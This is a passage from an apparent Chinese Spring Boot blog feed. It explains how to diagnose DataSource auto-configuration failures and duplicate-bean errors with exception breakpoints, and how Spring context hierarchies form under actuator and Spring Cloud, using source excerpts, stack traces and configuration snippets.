class="title">class</span> &#125;)</span></span><br><span class="line"><span class="class"><span class="title">protected</span> <span class="title">static</span> <span class="title">class</span> <span class="title">PooledDataSourceConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么 <code>PooledDataSourceConfiguration</code> 是怎么生效的呢？从代码上可以看到<code>@Conditional(PooledDataSourceCondition.class)</code>。</p>
<p>那么再看<code>PooledDataSourceCondition</code>的具体实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> AnyNestedCondition&#125; that checks that either &#123;<span class="doctag">@code</span> spring.datasource.type&#125;</span></span><br><span class="line"><span class="comment"> * is set or &#123;<span class="doctag">@link</span> PooledDataSourceAvailableCondition&#125; applies.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PooledDataSourceCondition</span> <span class="keyword">extends</span> <span class="title">AnyNestedCondition</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	PooledDataSourceCondition() &#123;</span><br><span class="line">		<span class="keyword">super</span>(ConfigurationPhase.PARSE_CONFIGURATION);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@ConditionalOnProperty</span>(prefix = <span class="string">"spring.datasource"</span>, name = <span class="string">"type"</span>)</span><br><span class="line">	<span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ExplicitType</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Conditional</span>(PooledDataSourceAvailableCondition<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">	<span class="title">static</span> <span class="title">class</span> <span class="title">PooledDataSourceAvailable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>PooledDataSourceCondition</code>引入了<code>@Conditional(PooledDataSourceAvailableCondition.class)</code> ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> Condition&#125; to test if a supported connection pool is available.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PooledDataSourceAvailableCondition</span> <span class="keyword">extends</span> <span class="title">SpringBootCondition</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> ConditionOutcome <span class="title">getMatchOutcome</span><span class="params">(ConditionContext context,</span></span></span><br><span class="line"><span class="function"><span class="params">			AnnotatedTypeMetadata metadata)</span> </span>&#123;</span><br><span class="line">		ConditionMessage.Builder message = ConditionMessage</span><br><span class="line">				.forCondition(<span class="string">"PooledDataSource"</span>);</span><br><span class="line">		<span class="keyword">if</span> (getDataSourceClassLoader(context) != <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> ConditionOutcome</span><br><span class="line">					.match(message.foundExactly(<span class="string">"supported DataSource"</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ConditionOutcome</span><br><span class="line">				.noMatch(message.didNotFind(<span class="string">"supported DataSource"</span>).atAll());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Returns the class loader for the &#123;<span class="doctag">@link</span> DataSource&#125; class. Used to ensure that</span></span><br><span class="line"><span class="comment">	 * the driver class can actually be loaded by the data source.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> context the condition context</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the class loader</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> ClassLoader <span class="title">getDataSourceClassLoader</span><span class="params">(ConditionContext context)</span> </span>&#123;</span><br><span class="line">		Class&lt;?&gt; dataSourceClass = <span class="keyword">new</span> DataSourceBuilder(context.getClassLoader())</span><br><span class="line">				.findType();</span><br><span class="line">		<span class="keyword">return</span> (dataSourceClass == <span class="keyword">null</span> ? <span class="keyword">null</span> : dataSourceClass.getClassLoader());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从代码里，可以看到是尝试查找<code>dataSourceClass</code>，如果找到，条件就成立。那么debug下，可以发现查找到的<code>dataSourceClass</code>是：<code>org.apache.tomcat.jdbc.pool.DataSource</code> 。</p>
<p>那么再看下<code>org.apache.tomcat.jdbc.pool.DataSource</code>这个类是从哪里来的呢？</p>
<p>从maven依赖树可以看到，依赖是来自：<code>spring-boot-starter-jdbc</code>。所以是应用依赖了<code>spring-boot-starter-jdbc</code>，但是并没有配置<code>DataSource</code>引起的问题。</p>
<h2 id="问题解决办法"><a href="#问题解决办法" class="headerlink" title="问题解决办法"></a>问题解决办法</h2><p>有两种：</p>
<ol>
<li>没有使用到<code>DataSource</code>，则可以把<code>spring-boot-starter-jdbc</code>的依赖去掉，这样就不会触发spring boot相关的代码</li>
<li>把spring boot自动初始化<code>DataSource</code>相关的代码禁止掉</li>
</ol>
<p>禁止的办法有两种：</p>
<ol>
<li><p>在main函数上配置exclude</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@SpringBootApplication(exclude = &#123; DataSourceAutoConfiguration.class, DataSourceTransactionManagerAutoConfiguration.class &#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>在application.properties里配置：</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol start="0">
<li>应用没有使用到<code>DataSource</code>，但是在pom.xml里引入了<code>spring-boot-starter-jdbc</code></li>
<li><code>spring-boot-starter-jdbc</code>带入了<code>tomcat-jdbc</code>，它里面有<code>org.apache.tomcat.jdbc.pool.DataSource</code></li>
<li>spring boot里的<code>PooledDataSourceConfiguration</code>，判断classpath下面有<code>DataSource</code>的实现类，尝试去创建<code>DataSource</code> bean</li>
<li>在初始化<code>DataSourceProperties</code>时，尝试通过jdbc的url来探测driver class</li>
<li>因为应用并没有配置url，所以最终在<code>DataSourceProperties.determineDriverClassName()</code>里抛出<code>Cannot determine embedded database driver class for database type NONE</code></li>
</ol>
<p>最后：</p>
<ul>
<li>排查spring boot的AutoConfiguration问题时，可以按异常栈，一层层排查<code>Configuration</code>是怎么引入的，再排查<code>Condition</code>具体的判断代码。</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>深入Spring Boot：排查expected single matching bean but found 2的异常</title>
    <url>/spring-boot-expected-single-but-found-2/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这个demo来说明怎么排查一个常见的spring expected single matching bean but found 2的异常。</p>
<p><a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-expected-single" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-expected-single</a></p>
<h2 id="调试排查-expected-single-matching-bean-but-found-2-的错误"><a href="#调试排查-expected-single-matching-bean-but-found-2-的错误" class="headerlink" title="调试排查 expected single matching bean but found 2 的错误"></a>调试排查 expected single matching bean but found 2 的错误</h2><p>把工程导入IDE里，直接启动应用，抛出来的异常信息是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Caused by: org.springframework.beans.factory.NoUniqueBeanDefinitionException: No qualifying bean of type &apos;javax.sql.DataSource&apos; available: expected single matching bean but found 2: h2DataSource1,h2DataSource2</span><br><span class="line">	at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveNamedBean(DefaultListableBeanFactory.java:1041) ~[spring-beans-4.3.9.RELEASE.jar:4.3.9.RELEASE]</span><br><span class="line">	at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:345) ~[spring-beans-4.3.9.RELEASE.jar:4.3.9.RELEASE]</span><br><span class="line">	at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:340) ~[spring-beans-4.3.9.RELEASE.jar:4.3.9.RELEASE]</span><br><span class="line">	at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1090) ~[spring-context-4.3.9.RELEASE.jar:4.3.9.RELEASE]</span><br><span class="line">	at org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.init(DataSourceInitializer.java:71) ~[spring-boot-autoconfigure-1.4.7.RELEASE.jar:1.4.7.RELEASE]</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_112]</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_112]</span><br><span class="line">	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_112]</span><br><span class="line">	at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_112]</span><br><span class="line">	at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:366) ~[spring-beans-4.3.9.RELEASE.jar:4.3.9.RELEASE]</span><br><span class="line">	at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:311) ~[spring-beans-4.3.9.RELEASE.jar:4.3.9.RELEASE]</span><br><span class="line">	at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:134) ~[spring-beans-4.3.9.RELEASE.jar:4.3.9.RELEASE]</span><br><span class="line">	... 30 common frames omitted</span><br></pre></td></tr></table></figure>
<p>很多人碰到这种错误时，就乱配置一通，找不到下手的办法。其实耐心排查下，是很简单的。</p>
<h2 id="抛出异常的原因"><a href="#抛出异常的原因" class="headerlink" title="抛出异常的原因"></a>抛出异常的原因</h2><p>异常信息写得很清楚了，在spring context里需要注入/获取到一个<code>DataSource</code>  bean，但是现在spring context里出现了两个，它们的名字是：h2DataSource1,h2DataSource2</p>
<p>那么有两个问题：</p>
<ol>
<li>应用是在哪里要注入/获取到一个<code>DataSource</code>  bean？</li>
<li>h2DataSource1,h2DataSource2 是在哪里定义的？</li>
</ol>
<h2 id="使用-Java-Exception-Breakpoint"><a href="#使用-Java-Exception-Breakpoint" class="headerlink" title="使用 Java Exception Breakpoint"></a>使用 Java Exception Breakpoint</h2><p>在IDE里，新建一个断点，类型是<code>Java Exception Breakpoint</code>（如果不清楚怎么添加，可以搜索对应IDE的使用文档），异常类是上面抛出来的<code>NoUniqueBeanDefinitionException</code>。</p>
<p>当断点停住时，查看栈，可以很清楚地找到是在<code>DataSourceInitializer.init() line: 71</code>这里要获取<code>DataSource</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Thread [main] (Suspended (exception NoUniqueBeanDefinitionException))</span><br><span class="line">	owns: ConcurrentHashMap&lt;K,V&gt;  (id=49)</span><br><span class="line">	owns: Object  (id=50)</span><br><span class="line">	DefaultListableBeanFactory.resolveNamedBean(Class&lt;T&gt;, Object...) line: 1041</span><br><span class="line">	DefaultListableBeanFactory.getBean(Class&lt;T&gt;, Object...) line: 345</span><br><span class="line">	DefaultListableBeanFactory.getBean(Class&lt;T&gt;) line: 340</span><br><span class="line">	AnnotationConfigEmbeddedWebApplicationContext(AbstractApplicationContext).getBean(Class&lt;T&gt;) line: 1090</span><br><span class="line">	DataSourceInitializer.init() line: 71</span><br><span class="line">	NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) line: not available [native method]</span><br><span class="line">	NativeMethodAccessorImpl.invoke(Object, Object[]) line: 62</span><br><span class="line">	DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 43</span><br><span class="line">	Method.invoke(Object, Object...) line: 498</span><br><span class="line">	InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(Object) line: 366</span><br><span class="line">	InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(Object, String) line: 311</span><br><span class="line">	CommonAnnotationBeanPostProcessor(InitDestroyAnnotationBeanPostProcessor).postProcessBeforeInitialization(Object, String) line: 134</span><br><span class="line">	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).applyBeanPostProcessorsBeforeInitialization(Object, String) line: 409</span><br><span class="line">	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).initializeBean(String, Object, RootBeanDefinition) line: 1620</span><br><span class="line">	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).doCreateBean(String, RootBeanDefinition, Object[]) line: 555</span><br><span class="line">	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).createBean(String, RootBeanDefinition, Object[]) line: 483</span><br><span class="line">	AbstractBeanFactory$1.getObject() line: 306</span><br><span class="line">	DefaultListableBeanFactory(DefaultSingletonBeanRegistry).getSingleton(String, ObjectFactory&lt;?&gt;) line: 230</span><br><span class="line">	DefaultListableBeanFactory(AbstractBeanFactory).doGetBean(String, Class&lt;T&gt;, Object[], boolean) line: 302</span><br><span class="line">	DefaultListableBeanFactory(AbstractBeanFactory).getBean(String, Class&lt;T&gt;, Object...) line: 220</span><br><span class="line">	DefaultListableBeanFactory.resolveNamedBean(Class&lt;T&gt;, Object...) line: 1018</span><br><span class="line">	DefaultListableBeanFactory.getBean(Class&lt;T&gt;, Object...) line: 345</span><br><span class="line">	DefaultListableBeanFactory.getBean(Class&lt;T&gt;) line: 340</span><br><span class="line">	DataSourceInitializerPostProcessor.postProcessAfterInitialization(Object, String) line: 62</span><br><span class="line">	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).applyBeanPostProcessorsAfterInitialization(Object, String) line: 423</span><br><span class="line">	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).initializeBean(String, Object, RootBeanDefinition) line: 1633</span><br><span class="line">	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).doCreateBean(String, RootBeanDefinition, Object[]) line: 555</span><br><span class="line">	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).createBean(String, RootBeanDefinition, Object[]) line: 483</span><br><span class="line">	AbstractBeanFactory$1.getObject() line: 306</span><br><span class="line">	DefaultListableBeanFactory(DefaultSingletonBeanRegistry).getSingleton(String, ObjectFactory&lt;?&gt;) line: 230</span><br><span class="line">	DefaultListableBeanFactory(AbstractBeanFactory).doGetBean(String, Class&lt;T&gt;, Object[], boolean) line: 302</span><br><span class="line">	DefaultListableBeanFactory(AbstractBeanFactory).getBean(String) line: 197</span><br><span class="line">	DefaultListableBeanFactory.preInstantiateSingletons() line: 761</span><br><span class="line">	AnnotationConfigEmbeddedWebApplicationContext(AbstractApplicationContext).finishBeanFactoryInitialization(ConfigurableListableBeanFactory) line: 867</span><br><span class="line">	AnnotationConfigEmbeddedWebApplicationContext(AbstractApplicationContext).refresh() line: 543</span><br><span class="line">	AnnotationConfigEmbeddedWebApplicationContext(EmbeddedWebApplicationContext).refresh() line: 122</span><br><span class="line">	SpringApplication.refresh(ApplicationContext) line: 762</span><br><span class="line">	SpringApplication.refreshContext(ConfigurableApplicationContext) line: 372</span><br><span class="line">	SpringApplication.run(String...) line: 316</span><br><span class="line">	SpringApplication.run(Object[], String[]) line: 1187</span><br><span class="line">	SpringApplication.run(Object, String...) line: 1176</span><br><span class="line">	DemoExpectedSingleApplication.main(String[]) line: 17</span><br></pre></td></tr></table></figure>
<h3 id="定位哪里要注入-使用DataSource"><a href="#定位哪里要注入-使用DataSource" class="headerlink" title="定位哪里要注入/使用DataSource"></a>定位哪里要注入/使用<code>DataSource</code></h3><p>要获取<code>DataSource</code>具体的代码是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.init()</span></span><br><span class="line">	<span class="meta">@PostConstruct</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">this</span>.properties.isInitialize()) &#123;</span><br><span class="line">			logger.debug(<span class="string">"Initialization disabled (not running DDL scripts)"</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.applicationContext.getBeanNamesForType(DataSource<span class="class">.<span class="keyword">class</span>, <span class="title">false</span>,</span></span><br><span class="line"><span class="class">				<span class="title">false</span>).<span class="title">length</span> &gt; 0) </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.dataSource = <span class="keyword">this</span>.applicationContext.getBean(DataSource<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.dataSource == <span class="keyword">null</span>) &#123;</span><br><span class="line">			logger.debug(<span class="string">"No DataSource found so not initializing"</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		runSchemaScripts();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>this.applicationContext.getBean(DataSource.class);</code> 要求spring context里只有一个<code>DataSource</code>的bean，但是应用里有两个，所以抛出了<code>NoUniqueBeanDefinitionException</code>。</p>
<h3 id="从BeanDefinition获取bean具体定义的代码"><a href="#从BeanDefinition获取bean具体定义的代码" class="headerlink" title="从BeanDefinition获取bean具体定义的代码"></a>从<code>BeanDefinition</code>获取bean具体定义的代码</h3><p>我们再来看 h2DataSource1,h2DataSource2 是在哪里定义的？</p>
<p>上面进程断在了<code>DefaultListableBeanFactory.resolveNamedBean(Class&lt;T&gt;, Object...)</code> 函数里的 <code>throw new NoUniqueBeanDefinitionException(requiredType, candidates.keySet());</code> 这一行。</p>
<p>那么我们在这里执行一下（如果不清楚，先搜索下IDE怎么在断点情况下执行代码）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.getBeanDefinition(<span class="string">"h2DataSource1"</span>)</span><br></pre></td></tr></table></figure>
<p>返回的信息是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Root bean: class [null]; scope=; abstract=false; lazyInit=false; autowireMode=3; dependencyCheck=0; autowireCandidate=true; primary=false; factoryBeanName=demoExpectedSingleApplication; factoryMethodName=h2DataSource1; initMethodName=null; destroyMethodName=(inferred);</span><br><span class="line">defined in com.example.demo.expected.single.DemoExpectedSingleApplication</span><br></pre></td></tr></table></figure>
<p>可以很清楚地定位到<code>h2DataSource1</code>这个bean是在 <code>com.example.demo.expected.single.DemoExpectedSingleApplication</code>里定义的。</p>
<p>所以上面两个问题的答案是：</p>
<ol>
<li>是spring boot代码里的<code>DataSourceInitializer.init() line: 71</code>这里要获取<code>DataSource</code>，并且只允许有一个<code>DataSource</code>实例</li>
<li>h2DataSource1,h2DataSource2 是在<code>com.example.demo.expected.single.DemoExpectedSingleApplication</code>里定义的</li>
</ol>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>上面排查到的原因是：应用定义了两个<code>DataSource</code>实例，但是spring boot却要求只有一个。那么有两种办法来解决：</p>
<ol>
<li>使用<code>@Primary</code>来指定一个优先使用的<code>DataSource</code>，这样子spring boot里自动初始的代码会获取到<code>@Primary</code>的bean</li>
<li>把spring boot自动初始化<code>DataSource</code>相关的代码禁止掉，应用自己来控制所有的<code>DataSource</code>相关的bean</li>
</ol>
<p>禁止的办法有两种：</p>
<ol>
<li><p>在main函数上配置exclude</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@SpringBootApplication(exclude = &#123; DataSourceAutoConfiguration.class, DataSourceTransactionManagerAutoConfiguration.class &#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>在application.properties里配置：</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>排查spring初始化问题时，灵活使用Java Exception Breakpoint</li>
<li>从异常栈上，可以很容易找到哪里要注入/使用bean</li>
<li>从<code>BeanDefinition</code>可以找到bean是在哪里定义的（哪个Configuration类/xml）</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>深入Spring Boot：Spring Context的继承关系和影响</title>
    <url>/spring-boot-context/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于一个简单的Spring boot应用，它的spring context是只会有一个。</p>
<ul>
<li>非web spring boot应用，context是<a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/context/annotation/AnnotationConfigApplicationContext.html" target="_blank" rel="noopener"><code>AnnotationConfigApplicationContext</code></a></li>
<li>web spring boot应用，context是<a href="http://docs.spring.io/spring-boot/docs.old/current/api/org/springframework/boot/context/embedded/AnnotationConfigEmbeddedWebApplicationContext.html" target="_blank" rel="noopener"><code>AnnotationConfigEmbeddedWebApplicationContext</code></a></li>
</ul>
<p><code>AnnotationConfigEmbeddedWebApplicationContext</code>是spring boot里自己实现的一个context，主要功能是启动embedded servlet container，比如tomcat/jetty。</p>
<p>这个和传统的war包应用不一样，传统的war包应用有两个spring context。参考：<a href="http://hengyunabc.github.io/something-about-spring-mvc-webapplicationcontext/">http://hengyunabc.github.io/something-about-spring-mvc-webapplicationcontext/</a></p>
<p>但是对于一个复杂点的spring boot应用，它的spring context可能会是多个，下面分析下各种情况。</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>这个Demo展示不同情况下的spring boot context的继承情况。</p>
<p><a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-classloader-context" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-classloader-context</a></p>
<h2 id="配置spring-boot-actuator-endpoints独立端口时"><a href="#配置spring-boot-actuator-endpoints独立端口时" class="headerlink" title="配置spring boot actuator/endpoints独立端口时"></a>配置spring boot actuator/endpoints独立端口时</h2><p>spring boot actuator默认情况下和应用共用一个tomcat，这样子的话就会直接把应用的endpoints暴露出去，带来很大的安全隐患。</p>
<p>尽管 Spring boot后面默认把这个关掉，需要配置<code>management.security.enabled=false</code>才可以访问，但是这个还是太危险了。</p>
<p>所以通常都建议把endpoints开在另外一个独立的端口上，比如 <code>management.port=8081</code>。</p>
<p>可以增加<code>-Dspring.cloud.bootstrap.enabled=false</code>，来禁止spring cloud，然后启动Demo。比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mvn spring-boot:run -Dspring.cloud.bootstrap.enabled=false</span><br></pre></td></tr></table></figure>
<p>然后打开 <a href="http://localhost:8080/" target="_blank" rel="noopener">http://localhost:8080/</a> 可以看到应用的spring context继承结构。</p>
<p>打开 <a href="http://localhost:8081/contexttree" target="_blank" rel="noopener">http://localhost:8081/contexttree</a> 可以看到Management Spring Contex的继承结构。</p>
<ul>
<li>可以看到当配置management独立端口时，management context的parent是应用的spring context</li>
<li>相关的实现代码在 <code>org.springframework.boot.actuate.autoconfigure.EndpointWebMvcAutoConfiguration</code> 里</li>
</ul>
<h2 id="在sprig-cloud环境下spring-context的情况"><a href="#在sprig-cloud环境下spring-context的情况" class="headerlink" title="在sprig cloud环境下spring context的情况"></a>在sprig cloud环境下spring context的情况</h2><p>在有spring cloud时（通常是引入 <code>spring-cloud-starter</code>），因为spring cloud有自己的一套配置初始化机制，所以它实际上是自己启动了一个Spring context，并把自己置为应用的context的parent。</p>
<p>spring cloud context的启动代码在<code>org.springframework.cloud.bootstrap.BootstrapApplicationListener</code>里。</p>
<p>spring cloud context实际上是一个特殊的spring boot context，它只扫描<code>BootstrapConfiguration</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader classLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="comment">// Use names and ensure unique to protect against duplicates</span></span><br><span class="line">List&lt;String&gt; names = SpringFactoriesLoader</span><br><span class="line">    .loadFactoryNames(BootstrapConfiguration<span class="class">.<span class="keyword">class</span>, <span class="title">classLoader</span>)</span>;</span><br><span class="line"><span class="keyword">for</span> (String name : StringUtils.commaDelimitedListToStringArray(</span><br><span class="line">    environment.getProperty(<span class="string">"spring.cloud.bootstrap.sources"</span>, <span class="string">""</span>))) &#123;</span><br><span class="line">  names.add(name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> is it possible or sensible to share a ResourceLoader?</span></span><br><span class="line">SpringApplicationBuilder builder = <span class="keyword">new</span> SpringApplicationBuilder()</span><br><span class="line">    .profiles(environment.getActiveProfiles()).bannerMode(Mode.OFF)</span><br><span class="line">    .environment(bootstrapEnvironment)</span><br><span class="line">    .properties(<span class="string">"spring.application.name:"</span> + configName)</span><br><span class="line">    .registerShutdownHook(<span class="keyword">false</span>).logStartupInfo(<span class="keyword">false</span>).web(<span class="keyword">false</span>);</span><br><span class="line">List&lt;Class&lt;?&gt;&gt; sources = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br></pre></td></tr></table></figure>
<p>最终会把这个<code>ParentContextApplicationContextInitializer</code>加到应用的spring context里，来把自己设置为应用的context的parent。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ParentContextApplicationContextInitializer</span> <span class="keyword">implements</span></span></span><br><span class="line"><span class="class">		<span class="title">ApplicationContextInitializer</span>&lt;<span class="title">ConfigurableApplicationContext</span>&gt;, <span class="title">Ordered</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> order = Ordered.HIGHEST_PRECEDENCE;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> ApplicationContext parent;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">(ConfigurableApplicationContext applicationContext)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (applicationContext != <span class="keyword">this</span>.parent) &#123;</span><br><span class="line">			applicationContext.setParent(<span class="keyword">this</span>.parent);</span><br><span class="line">			applicationContext.addApplicationListener(EventPublisher.INSTANCE);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>和上面一样，直接启动demo，不要配置<code>-Dspring.cloud.bootstrap.enabled=false</code>，然后访问对应的url，就可以看到spring context的继承情况。</p>
<h2 id="如何在应用代码里获取到-Management-Spring-Context"><a href="#如何在应用代码里获取到-Management-Spring-Context" class="headerlink" title="如何在应用代码里获取到 Management Spring Context"></a>如何在应用代码里获取到 Management Spring Context</h2><p>如果应用代码想获取到Management Spring Context，可以通过这个bean：org.springframework.boot.actuate.autoconfigure.ManagementContextResolver</p>
<p>spring boot在创建Management Spring Context时，就会保存到ManagementContextResolver里。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass</span>(&#123; Servlet<span class="class">.<span class="keyword">class</span>, <span class="title">DispatcherServlet</span>.<span class="title">class</span> &#125;)</span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnWebApplication</span></span></span><br><span class="line"><span class="class">@<span class="title">AutoConfigureAfter</span>(</span>&#123; PropertyPlaceholderAutoConfiguration<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">		<span class="title">EmbeddedServletContainerAutoConfiguration</span>.<span class="title">class</span>, <span class="title">WebMvcAutoConfiguration</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">		<span class="title">ManagementServerPropertiesAutoConfiguration</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">		<span class="title">RepositoryRestMvcAutoConfiguration</span>.<span class="title">class</span>, <span class="title">HypermediaAutoConfiguration</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">		<span class="title">HttpMessageConvertersAutoConfiguration</span>.<span class="title">class</span> &#125;)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">EndpointWebMvcAutoConfiguration</span></span></span><br><span class="line"><span class="class">		<span class="keyword">implements</span> <span class="title">ApplicationContextAware</span>, <span class="title">BeanFactoryAware</span>, <span class="title">SmartInitializingSingleton</span> </span>&#123;</span><br><span class="line">      <span class="meta">@Bean</span></span><br><span class="line">    	<span class="function"><span class="keyword">public</span> ManagementContextResolver <span class="title">managementContextResolver</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    		<span class="keyword">return</span> <span 